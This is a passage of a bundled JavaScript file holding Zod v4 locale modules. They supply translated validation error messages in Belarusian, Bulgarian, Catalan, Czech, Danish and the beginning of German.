    cidrv6: "IPv6 \u0434\u044B\u044F\u043F\u0430\u0437\u043E\u043D",
    base64: "\u0440\u0430\u0434\u043E\u043A \u0443 \u0444\u0430\u0440\u043C\u0430\u0446\u0435 base64",
    base64url: "\u0440\u0430\u0434\u043E\u043A \u0443 \u0444\u0430\u0440\u043C\u0430\u0446\u0435 base64url",
    json_string: "JSON \u0440\u0430\u0434\u043E\u043A",
    e164: "\u043D\u0443\u043C\u0430\u0440 E.164",
    jwt: "JWT",
    template_literal: "\u0443\u0432\u043E\u0434"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u043B\u0456\u043A",
    array: "\u043C\u0430\u0441\u0456\u045E"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u045E\u0432\u043E\u0434: \u0447\u0430\u043A\u0430\u045E\u0441\u044F instanceof ${issue2.expected}, \u0430\u0442\u0440\u044B\u043C\u0430\u043D\u0430 ${received}`;
        }
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u045E\u0432\u043E\u0434: \u0447\u0430\u043A\u0430\u045E\u0441\u044F ${expected}, \u0430\u0442\u0440\u044B\u043C\u0430\u043D\u0430 ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u045E\u0432\u043E\u0434: \u0447\u0430\u043A\u0430\u043B\u0430\u0441\u044F ${stringifyPrimitive(issue2.values[0])}`;
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u0432\u0430\u0440\u044B\u044F\u043D\u0442: \u0447\u0430\u043A\u0430\u045E\u0441\u044F \u0430\u0434\u0437\u0456\u043D \u0437 ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          const maxValue = Number(issue2.maximum);
          const unit = getBelarusianPlural(maxValue, sizing.unit.one, sizing.unit.few, sizing.unit.many);
          return `\u0417\u0430\u043D\u0430\u0434\u0442\u0430 \u0432\u044F\u043B\u0456\u043A\u0456: \u0447\u0430\u043A\u0430\u043B\u0430\u0441\u044F, \u0448\u0442\u043E ${issue2.origin ?? "\u0437\u043D\u0430\u0447\u044D\u043D\u043D\u0435"} \u043F\u0430\u0432\u0456\u043D\u043D\u0430 ${sizing.verb} ${adj}${issue2.maximum.toString()} ${unit}`;
        }
        return `\u0417\u0430\u043D\u0430\u0434\u0442\u0430 \u0432\u044F\u043B\u0456\u043A\u0456: \u0447\u0430\u043A\u0430\u043B\u0430\u0441\u044F, \u0448\u0442\u043E ${issue2.origin ?? "\u0437\u043D\u0430\u0447\u044D\u043D\u043D\u0435"} \u043F\u0430\u0432\u0456\u043D\u043D\u0430 \u0431\u044B\u0446\u044C ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          const minValue = Number(issue2.minimum);
          const unit = getBelarusianPlural(minValue, sizing.unit.one, sizing.unit.few, sizing.unit.many);
          return `\u0417\u0430\u043D\u0430\u0434\u0442\u0430 \u043C\u0430\u043B\u044B: \u0447\u0430\u043A\u0430\u043B\u0430\u0441\u044F, \u0448\u0442\u043E ${issue2.origin} \u043F\u0430\u0432\u0456\u043D\u043D\u0430 ${sizing.verb} ${adj}${issue2.minimum.toString()} ${unit}`;
        }
        return `\u0417\u0430\u043D\u0430\u0434\u0442\u0430 \u043C\u0430\u043B\u044B: \u0447\u0430\u043A\u0430\u043B\u0430\u0441\u044F, \u0448\u0442\u043E ${issue2.origin} \u043F\u0430\u0432\u0456\u043D\u043D\u0430 \u0431\u044B\u0446\u044C ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u0440\u0430\u0434\u043E\u043A: \u043F\u0430\u0432\u0456\u043D\u0435\u043D \u043F\u0430\u0447\u044B\u043D\u0430\u0446\u0446\u0430 \u0437 "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u0440\u0430\u0434\u043E\u043A: \u043F\u0430\u0432\u0456\u043D\u0435\u043D \u0437\u0430\u043A\u0430\u043D\u0447\u0432\u0430\u0446\u0446\u0430 \u043D\u0430 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u0440\u0430\u0434\u043E\u043A: \u043F\u0430\u0432\u0456\u043D\u0435\u043D \u0437\u043C\u044F\u0448\u0447\u0430\u0446\u044C "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u0440\u0430\u0434\u043E\u043A: \u043F\u0430\u0432\u0456\u043D\u0435\u043D \u0430\u0434\u043F\u0430\u0432\u044F\u0434\u0430\u0446\u044C \u0448\u0430\u0431\u043B\u043E\u043D\u0443 ${_issue.pattern}`;
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u043B\u0456\u043A: \u043F\u0430\u0432\u0456\u043D\u0435\u043D \u0431\u044B\u0446\u044C \u043A\u0440\u0430\u0442\u043D\u044B\u043C ${issue2.divisor}`;
      case "unrecognized_keys":
        return `\u041D\u0435\u0440\u0430\u0441\u043F\u0430\u0437\u043D\u0430\u043D\u044B ${issue2.keys.length > 1 ? "\u043A\u043B\u044E\u0447\u044B" : "\u043A\u043B\u044E\u0447"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u043A\u043B\u044E\u0447 \u0443 ${issue2.origin}`;
      case "invalid_union":
        return "\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u045E\u0432\u043E\u0434";
      case "invalid_element":
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u0430\u0435 \u0437\u043D\u0430\u0447\u044D\u043D\u043D\u0435 \u045E ${issue2.origin}`;
      default:
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u045E\u0432\u043E\u0434`;
    }
  };
};
function be_default() {
  return {
    localeError: error3()
  };
}
// node_modules/zod/v4/locales/bg.js
var error4 = () => {
  const Sizable = {
    string: { unit: "\u0441\u0438\u043C\u0432\u043E\u043B\u0430", verb: "\u0434\u0430 \u0441\u044A\u0434\u044A\u0440\u0436\u0430" },
    file: { unit: "\u0431\u0430\u0439\u0442\u0430", verb: "\u0434\u0430 \u0441\u044A\u0434\u044A\u0440\u0436\u0430" },
    array: { unit: "\u0435\u043B\u0435\u043C\u0435\u043D\u0442\u0430", verb: "\u0434\u0430 \u0441\u044A\u0434\u044A\u0440\u0436\u0430" },
    set: { unit: "\u0435\u043B\u0435\u043C\u0435\u043D\u0442\u0430", verb: "\u0434\u0430 \u0441\u044A\u0434\u044A\u0440\u0436\u0430" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u0432\u0445\u043E\u0434",
    email: "\u0438\u043C\u0435\u0439\u043B \u0430\u0434\u0440\u0435\u0441",
    url: "URL",
    emoji: "\u0435\u043C\u043E\u0434\u0436\u0438",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \u0432\u0440\u0435\u043C\u0435",
    date: "ISO \u0434\u0430\u0442\u0430",
    time: "ISO \u0432\u0440\u0435\u043C\u0435",
    duration: "ISO \u043F\u0440\u043E\u0434\u044A\u043B\u0436\u0438\u0442\u0435\u043B\u043D\u043E\u0441\u0442",
    ipv4: "IPv4 \u0430\u0434\u0440\u0435\u0441",
    ipv6: "IPv6 \u0430\u0434\u0440\u0435\u0441",
    cidrv4: "IPv4 \u0434\u0438\u0430\u043F\u0430\u0437\u043E\u043D",
    cidrv6: "IPv6 \u0434\u0438\u0430\u043F\u0430\u0437\u043E\u043D",
    base64: "base64-\u043A\u043E\u0434\u0438\u0440\u0430\u043D \u043D\u0438\u0437",
    base64url: "base64url-\u043A\u043E\u0434\u0438\u0440\u0430\u043D \u043D\u0438\u0437",
    json_string: "JSON \u043D\u0438\u0437",
    e164: "E.164 \u043D\u043E\u043C\u0435\u0440",
    jwt: "JWT",
    template_literal: "\u0432\u0445\u043E\u0434"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u0447\u0438\u0441\u043B\u043E",
    array: "\u043C\u0430\u0441\u0438\u0432"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u0435\u043D \u0432\u0445\u043E\u0434: \u043E\u0447\u0430\u043A\u0432\u0430\u043D instanceof ${issue2.expected}, \u043F\u043E\u043B\u0443\u0447\u0435\u043D ${received}`;
        }
        return `\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u0435\u043D \u0432\u0445\u043E\u0434: \u043E\u0447\u0430\u043A\u0432\u0430\u043D ${expected}, \u043F\u043E\u043B\u0443\u0447\u0435\u043D ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u0435\u043D \u0432\u0445\u043E\u0434: \u043E\u0447\u0430\u043A\u0432\u0430\u043D ${stringifyPrimitive(issue2.values[0])}`;
        return `\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u043D\u0430 \u043E\u043F\u0446\u0438\u044F: \u043E\u0447\u0430\u043A\u0432\u0430\u043D\u043E \u0435\u0434\u043D\u043E \u043E\u0442 ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\u0422\u0432\u044A\u0440\u0434\u0435 \u0433\u043E\u043B\u044F\u043C\u043E: \u043E\u0447\u0430\u043A\u0432\u0430 \u0441\u0435 ${issue2.origin ?? "\u0441\u0442\u043E\u0439\u043D\u043E\u0441\u0442"} \u0434\u0430 \u0441\u044A\u0434\u044A\u0440\u0436\u0430 ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "\u0435\u043B\u0435\u043C\u0435\u043D\u0442\u0430"}`;
        return `\u0422\u0432\u044A\u0440\u0434\u0435 \u0433\u043E\u043B\u044F\u043C\u043E: \u043E\u0447\u0430\u043A\u0432\u0430 \u0441\u0435 ${issue2.origin ?? "\u0441\u0442\u043E\u0439\u043D\u043E\u0441\u0442"} \u0434\u0430 \u0431\u044A\u0434\u0435 ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u0422\u0432\u044A\u0440\u0434\u0435 \u043C\u0430\u043B\u043A\u043E: \u043E\u0447\u0430\u043A\u0432\u0430 \u0441\u0435 ${issue2.origin} \u0434\u0430 \u0441\u044A\u0434\u044A\u0440\u0436\u0430 ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `\u0422\u0432\u044A\u0440\u0434\u0435 \u043C\u0430\u043B\u043A\u043E: \u043E\u0447\u0430\u043A\u0432\u0430 \u0441\u0435 ${issue2.origin} \u0434\u0430 \u0431\u044A\u0434\u0435 ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u0435\u043D \u043D\u0438\u0437: \u0442\u0440\u044F\u0431\u0432\u0430 \u0434\u0430 \u0437\u0430\u043F\u043E\u0447\u0432\u0430 \u0441 "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u0435\u043D \u043D\u0438\u0437: \u0442\u0440\u044F\u0431\u0432\u0430 \u0434\u0430 \u0437\u0430\u0432\u044A\u0440\u0448\u0432\u0430 \u0441 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u0435\u043D \u043D\u0438\u0437: \u0442\u0440\u044F\u0431\u0432\u0430 \u0434\u0430 \u0432\u043A\u043B\u044E\u0447\u0432\u0430 "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u0435\u043D \u043D\u0438\u0437: \u0442\u0440\u044F\u0431\u0432\u0430 \u0434\u0430 \u0441\u044A\u0432\u043F\u0430\u0434\u0430 \u0441 ${_issue.pattern}`;
        let invalid_adj = "\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u0435\u043D";
        if (_issue.format === "emoji")
          invalid_adj = "\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u043D\u043E";
        if (_issue.format === "datetime")
          invalid_adj = "\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u043D\u043E";
        if (_issue.format === "date")
          invalid_adj = "\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u043D\u0430";
        if (_issue.format === "time")
          invalid_adj = "\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u043D\u043E";
        if (_issue.format === "duration")
          invalid_adj = "\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u043D\u0430";
        return `${invalid_adj} ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u043D\u043E \u0447\u0438\u0441\u043B\u043E: \u0442\u0440\u044F\u0431\u0432\u0430 \u0434\u0430 \u0431\u044A\u0434\u0435 \u043A\u0440\u0430\u0442\u043D\u043E \u043D\u0430 ${issue2.divisor}`;
      case "unrecognized_keys":
        return `\u041D\u0435\u0440\u0430\u0437\u043F\u043E\u0437\u043D\u0430\u0442${issue2.keys.length > 1 ? "\u0438" : ""} \u043A\u043B\u044E\u0447${issue2.keys.length > 1 ? "\u043E\u0432\u0435" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u0435\u043D \u043A\u043B\u044E\u0447 \u0432 ${issue2.origin}`;
      case "invalid_union":
        return "\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u0435\u043D \u0432\u0445\u043E\u0434";
      case "invalid_element":
        return `\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u043D\u0430 \u0441\u0442\u043E\u0439\u043D\u043E\u0441\u0442 \u0432 ${issue2.origin}`;
      default:
        return `\u041D\u0435\u0432\u0430\u043B\u0438\u0434\u0435\u043D \u0432\u0445\u043E\u0434`;
    }
  };
};
function bg_default() {
  return {
    localeError: error4()
  };
}
// node_modules/zod/v4/locales/ca.js
var error5 = () => {
  const Sizable = {
    string: { unit: "car\xE0cters", verb: "contenir" },
    file: { unit: "bytes", verb: "contenir" },
    array: { unit: "elements", verb: "contenir" },
    set: { unit: "elements", verb: "contenir" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "entrada",
    email: "adre\xE7a electr\xF2nica",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "data i hora ISO",
    date: "data ISO",
    time: "hora ISO",
    duration: "durada ISO",
    ipv4: "adre\xE7a IPv4",
    ipv6: "adre\xE7a IPv6",
    cidrv4: "rang IPv4",
    cidrv6: "rang IPv6",
    base64: "cadena codificada en base64",
    base64url: "cadena codificada en base64url",
    json_string: "cadena JSON",
    e164: "n\xFAmero E.164",
    jwt: "JWT",
    template_literal: "entrada"
  };
  const TypeDictionary = {
    nan: "NaN"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Tipus inv\xE0lid: s'esperava instanceof ${issue2.expected}, s'ha rebut ${received}`;
        }
        return `Tipus inv\xE0lid: s'esperava ${expected}, s'ha rebut ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Valor inv\xE0lid: s'esperava ${stringifyPrimitive(issue2.values[0])}`;
        return `Opci\xF3 inv\xE0lida: s'esperava una de ${joinValues(issue2.values, " o ")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "com a m\xE0xim" : "menys de";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Massa gran: s'esperava que ${issue2.origin ?? "el valor"} contingu\xE9s ${adj} ${issue2.maximum.toString()} ${sizing.unit ?? "elements"}`;
        return `Massa gran: s'esperava que ${issue2.origin ?? "el valor"} fos ${adj} ${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? "com a m\xEDnim" : "m\xE9s de";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Massa petit: s'esperava que ${issue2.origin} contingu\xE9s ${adj} ${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `Massa petit: s'esperava que ${issue2.origin} fos ${adj} ${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `Format inv\xE0lid: ha de comen\xE7ar amb "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `Format inv\xE0lid: ha d'acabar amb "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Format inv\xE0lid: ha d'incloure "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Format inv\xE0lid: ha de coincidir amb el patr\xF3 ${_issue.pattern}`;
        return `Format inv\xE0lid per a ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `N\xFAmero inv\xE0lid: ha de ser m\xFAltiple de ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Clau${issue2.keys.length > 1 ? "s" : ""} no reconeguda${issue2.keys.length > 1 ? "s" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Clau inv\xE0lida a ${issue2.origin}`;
      case "invalid_union":
        return "Entrada inv\xE0lida";
      case "invalid_element":
        return `Element inv\xE0lid a ${issue2.origin}`;
      default:
        return `Entrada inv\xE0lida`;
    }
  };
};
function ca_default() {
  return {
    localeError: error5()
  };
}
// node_modules/zod/v4/locales/cs.js
var error6 = () => {
  const Sizable = {
    string: { unit: "znak\u016F", verb: "m\xEDt" },
    file: { unit: "bajt\u016F", verb: "m\xEDt" },
    array: { unit: "prvk\u016F", verb: "m\xEDt" },
    set: { unit: "prvk\u016F", verb: "m\xEDt" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "regul\xE1rn\xED v\xFDraz",
    email: "e-mailov\xE1 adresa",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "datum a \u010Das ve form\xE1tu ISO",
    date: "datum ve form\xE1tu ISO",
    time: "\u010Das ve form\xE1tu ISO",
    duration: "doba trv\xE1n\xED ISO",
    ipv4: "IPv4 adresa",
    ipv6: "IPv6 adresa",
    cidrv4: "rozsah IPv4",
    cidrv6: "rozsah IPv6",
    base64: "\u0159et\u011Bzec zak\xF3dovan\xFD ve form\xE1tu base64",
    base64url: "\u0159et\u011Bzec zak\xF3dovan\xFD ve form\xE1tu base64url",
    json_string: "\u0159et\u011Bzec ve form\xE1tu JSON",
    e164: "\u010D\xEDslo E.164",
    jwt: "JWT",
    template_literal: "vstup"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u010D\xEDslo",
    string: "\u0159et\u011Bzec",
    function: "funkce",
    array: "pole"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Neplatn\xFD vstup: o\u010Dek\xE1v\xE1no instanceof ${issue2.expected}, obdr\u017Eeno ${received}`;
        }
        return `Neplatn\xFD vstup: o\u010Dek\xE1v\xE1no ${expected}, obdr\u017Eeno ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Neplatn\xFD vstup: o\u010Dek\xE1v\xE1no ${stringifyPrimitive(issue2.values[0])}`;
        return `Neplatn\xE1 mo\u017Enost: o\u010Dek\xE1v\xE1na jedna z hodnot ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Hodnota je p\u0159\xEDli\u0161 velk\xE1: ${issue2.origin ?? "hodnota"} mus\xED m\xEDt ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "prvk\u016F"}`;
        }
        return `Hodnota je p\u0159\xEDli\u0161 velk\xE1: ${issue2.origin ?? "hodnota"} mus\xED b\xFDt ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Hodnota je p\u0159\xEDli\u0161 mal\xE1: ${issue2.origin ?? "hodnota"} mus\xED m\xEDt ${adj}${issue2.minimum.toString()} ${sizing.unit ?? "prvk\u016F"}`;
        }
        return `Hodnota je p\u0159\xEDli\u0161 mal\xE1: ${issue2.origin ?? "hodnota"} mus\xED b\xFDt ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Neplatn\xFD \u0159et\u011Bzec: mus\xED za\u010D\xEDnat na "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Neplatn\xFD \u0159et\u011Bzec: mus\xED kon\u010Dit na "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Neplatn\xFD \u0159et\u011Bzec: mus\xED obsahovat "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Neplatn\xFD \u0159et\u011Bzec: mus\xED odpov\xEDdat vzoru ${_issue.pattern}`;
        return `Neplatn\xFD form\xE1t ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Neplatn\xE9 \u010D\xEDslo: mus\xED b\xFDt n\xE1sobkem ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Nezn\xE1m\xE9 kl\xED\u010De: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Neplatn\xFD kl\xED\u010D v ${issue2.origin}`;
      case "invalid_union":
        return "Neplatn\xFD vstup";
      case "invalid_element":
        return `Neplatn\xE1 hodnota v ${issue2.origin}`;
      default:
        return `Neplatn\xFD vstup`;
    }
  };
};
function cs_default() {
  return {
    localeError: error6()
  };
}
// node_modules/zod/v4/locales/da.js
var error7 = () => {
  const Sizable = {
    string: { unit: "tegn", verb: "havde" },
    file: { unit: "bytes", verb: "havde" },
    array: { unit: "elementer", verb: "indeholdt" },
    set: { unit: "elementer", verb: "indeholdt" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "input",
    email: "e-mailadresse",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO dato- og klokkesl\xE6t",
    date: "ISO-dato",
    time: "ISO-klokkesl\xE6t",
    duration: "ISO-varighed",
    ipv4: "IPv4-omr\xE5de",
    ipv6: "IPv6-omr\xE5de",
    cidrv4: "IPv4-spektrum",
    cidrv6: "IPv6-spektrum",
    base64: "base64-kodet streng",
    base64url: "base64url-kodet streng",
    json_string: "JSON-streng",
    e164: "E.164-nummer",
    jwt: "JWT",
    template_literal: "input"
  };
  const TypeDictionary = {
    nan: "NaN",
    string: "streng",
    number: "tal",
    boolean: "boolean",
    array: "liste",
    object: "objekt",
    set: "s\xE6t",
    file: "fil"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Ugyldigt input: forventede instanceof ${issue2.expected}, fik ${received}`;
        }
        return `Ugyldigt input: forventede ${expected}, fik ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Ugyldig v\xE6rdi: forventede ${stringifyPrimitive(issue2.values[0])}`;
        return `Ugyldigt valg: forventede en af f\xF8lgende ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        const origin = TypeDictionary[issue2.origin] ?? issue2.origin;
        if (sizing)
          return `For stor: forventede ${origin ?? "value"} ${sizing.verb} ${adj} ${issue2.maximum.toString()} ${sizing.unit ?? "elementer"}`;
        return `For stor: forventede ${origin ?? "value"} havde ${adj} ${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        const origin = TypeDictionary[issue2.origin] ?? issue2.origin;
        if (sizing) {
          return `For lille: forventede ${origin} ${sizing.verb} ${adj} ${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `For lille: forventede ${origin} havde ${adj} ${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Ugyldig streng: skal starte med "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Ugyldig streng: skal ende med "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Ugyldig streng: skal indeholde "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Ugyldig streng: skal matche m\xF8nsteret ${_issue.pattern}`;
        return `Ugyldig ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Ugyldigt tal: skal v\xE6re deleligt med ${issue2.divisor}`;
      case "unrecognized_keys":
        return `${issue2.keys.length > 1 ? "Ukendte n\xF8gler" : "Ukendt n\xF8gle"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Ugyldig n\xF8gle i ${issue2.origin}`;
      case "invalid_union":
        return "Ugyldigt input: matcher ingen af de tilladte typer";
      case "invalid_element":
        return `Ugyldig v\xE6rdi i ${issue2.origin}`;
      default:
        return `Ugyldigt input`;
    }
  };
};
function da_default() {
  return {
    localeError: error7()
  };
}
// node_modules/zod/v4/locales/de.js
var error8 = () => {
  const Sizable = {
    string: { unit: "Zeichen", verb: "zu haben" },
    file: { unit: "Bytes", verb: "zu haben" },
    array: { unit: "Elemente", verb: "zu haben" },
    set: { unit: "Elemente", verb: "zu haben" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "Eingabe",
    email: "E-Mail-Adresse",
    url: "URL",
    emoji: "Emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO-Datum und -Uhrzeit",
    date: "ISO-Datum",
    time: "ISO-Uhrzeit",
    duration: "ISO-Dauer",
    ipv4: "IPv4-Adresse",
    ipv6: "IPv6-Adresse",
    cidrv4: "IPv4-Bereich",
    cidrv6: "IPv6-Bereich",
    base64: "Base64-codierter String",
    base64url: "Base64-URL-codierter String",
    json_string: "JSON-String",
    e164: "E.164-Nummer",
    jwt: "JWT",
    template_literal: "Eingabe"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "Zahl",
    array: "Array"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
